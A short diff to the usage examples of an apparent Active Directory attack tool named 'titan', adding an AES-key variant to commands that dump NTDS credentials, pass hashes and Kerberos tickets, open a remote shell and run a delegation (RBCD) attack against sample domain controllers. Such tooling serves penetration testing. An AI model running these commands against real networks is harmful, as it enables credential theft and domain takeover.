@@ -19,6 +19,7 @@ Quick examples:
   titan dump -u Administrator -d ECORP -p 'P@ss' --ntds -t 192.168.15.40
   titan dump -u Administrator -d ECORP -hashes :NThash -t 192.168.15.40
   KRB5CCNAME=Administrator.ccache titan dump -k -no-pass -t 192.168.15.40
+  titan dump ECORP/da_admin@dc01.ecorp.local --aes-key <hex> -dc-ip dc01
 
   titan shell ECORP/Administrator:'P@ss'@192.168.15.42
   titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
